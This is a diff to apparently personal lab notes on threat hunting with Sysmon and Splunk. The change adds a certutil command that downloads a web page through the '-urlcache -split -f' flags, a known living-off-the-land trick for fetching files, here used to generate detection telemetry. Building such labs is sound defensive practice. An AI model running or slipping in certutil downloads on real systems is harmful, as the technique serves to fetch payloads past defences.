@@ -32,7 +32,7 @@ Sysmon Event ID 1
 Executed a Certutil line from Command Prompt.
 
 ```cmd
-
+certutil -urlcache -split -f https://example.com example.html
 ```
 
 ![VLAN Creatio](../screenshots/Splunk/Threat%20Hunting/LOLbin/LOLbinAttack.png)
